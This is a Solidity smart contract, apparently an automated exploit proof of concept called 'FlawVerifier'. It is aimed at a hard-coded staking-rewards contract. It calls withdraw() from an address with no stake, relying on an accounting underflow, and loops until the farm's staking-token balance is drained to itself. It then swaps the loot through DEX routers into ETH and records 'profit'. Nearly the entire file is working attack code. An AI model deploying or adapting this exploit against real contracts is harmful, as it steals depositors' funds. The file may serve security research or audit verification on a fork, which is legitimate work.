// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    string public hypothesisResult;

    address public stakingTokenObserved;
    address public rewardsTokenObserved;

    uint256 public attackerRecordedStakeBefore;
    uint256 public attackerRecordedStakeAfter;
    uint256 public farmTotalSupplyBefore;
    uint256 public farmTotalSupplyAfter;
    uint256 public farmStakingBalanceBefore;
    uint256 public farmStakingBalanceAfter;
    uint256 public attackerWalletBalanceBefore;
    uint256 public attackerWalletBalanceAfter;
    uint256 public drainedRounds;

    string public exploitPathUsed;
    string public failureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = EXPECTED_STAKING_TOKEN;
        hypothesisResult = "unexecuted";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        stakingTokenObserved = farm.stakingToken();
        rewardsTokenObserved = farm.rewardsToken();
        _profitToken = stakingTokenObserved;

        attackerRecordedStakeBefore = farm.balanceOf(address(this));
        farmTotalSupplyBefore = farm.totalSupply();
        farmStakingBalanceBefore = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
        attackerWalletBalanceBefore = IERC20Like(stakingTokenObserved).balanceOf(address(this));

        exploitPathUsed = "call withdraw(amount) from an address with zero or insufficient recorded stake -> _balances[user] and _totalSupply underflow inside _withdraw(amount) -> stakingToken.transfer(recipient, amount) sends real staking tokens -> repeat until the farm staking-token balance is exhausted";

        if (stakingTokenObserved != EXPECTED_STAKING_TOKEN || rewardsTokenObserved != EXPECTED_REWARD_TOKEN) {
            failureReason = "unexpected live token addresses for the configured target";
            _snapshotAfter(farm);
            hypothesisResult = "refuted";
            return;
        }

        if (farmStakingBalanceBefore == 0) {
            // Concrete infeasibility reason for this exact exploit path: even though the accounting bug exists,
            // there is no live staking-token inventory in the farm to transfer to the attacker at this fork.
            failureReason = "farm holds zero staking tokens at the fork block";
            _snapshotAfter(farm);
            hypothesisResult = "refuted";
            return;
        }

        uint256 remaining = farmStakingBalanceBefore;
        uint256 previousRemaining = remaining;

        while (remaining != 0) {
            // Path stage 1: call withdraw(amount) from an address with zero or insufficient recorded stake.
            try farm.withdraw(remaining) {
                drainedRounds += 1;
            } catch Error(string memory reason) {
                failureReason = reason;
                break;
            } catch {
                failureReason = "withdraw reverted";
                break;
            }

            uint256 updatedRemaining = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
            if (updatedRemaining >= previousRemaining) {
                failureReason = "farm staking balance did not decrease after withdraw";
                break;
            }

            previousRemaining = updatedRemaining;
            remaining = updatedRemaining;
        }

        _snapshotAfter(farm);

        if (attackerWalletBalanceAfter > attackerWalletBalanceBefore) {
            _profitAmount = attackerWalletBalanceAfter - attackerWalletBalanceBefore;
            profitAchieved = true;
        }

        hypothesisValidated =
            _profitAmount != 0 &&
            attackerRecordedStakeBefore < farmStakingBalanceBefore &&
            stakingTokenObserved == EXPECTED_STAKING_TOKEN &&
            rewardsTokenObserved == EXPECTED_REWARD_TOKEN;

        hypothesisResult = hypothesisValidated ? "validated" : "refuted";
        _ahFinalizeTokenToEth();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _snapshotAfter(IStakingRewardsLike farm) internal {
        attackerRecordedStakeAfter = farm.balanceOf(address(this));
        farmTotalSupplyAfter = farm.totalSupply();
        farmStakingBalanceAfter = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
        attackerWalletBalanceAfter = IERC20Like(stakingTokenObserved).balanceOf(address(this));
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
